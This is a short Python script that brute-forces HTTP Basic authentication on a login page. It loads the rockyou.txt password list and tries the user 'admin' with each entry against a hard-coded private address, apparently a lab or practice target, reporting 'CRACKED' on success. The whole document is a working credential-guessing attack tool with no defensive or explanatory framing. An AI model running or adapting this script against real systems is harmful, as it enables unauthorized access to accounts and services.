from sys import argv
import os.path
import requests
import base64


pass_file = "/var/lib/rockyou.txt"

if(os.path.isfile(pass_file)):
    wordlist = open(pass_file, encoding='latin-1')
else:
    print("Error:\n\t Wordlist not found!\n")
    exit(1)

# Login Page URL
ip_address = "http://172.26.0.2:80"
port = 80
words = wordlist.readlines()

for user in ["admin"] :
    for passwd in words:
        user_pass = "%s:%s"%(user,passwd.strip())

        base64_value = base64.encodebytes(user_pass.encode()).split()[0]
        base64_value = base64_value.decode()
        hdr = {'Authorization': "Basic %s"%base64_value}
        print(hdr)
        try:
            res = requests.get(ip_address, headers = hdr)

        except:
            print("No such URL")
            exit(1)
        if res.status_code == 200 :
            print ("%s CRACKED: "%res.status_code + user + ":" + passwd)
            exit(0)
        elif res.status_code == 401 :
            print ("FAILED %s: %s:%s" %(res.status_code, user,passwd))
        else:
            print("Unexpected Status Code: %d "%res.status_code)
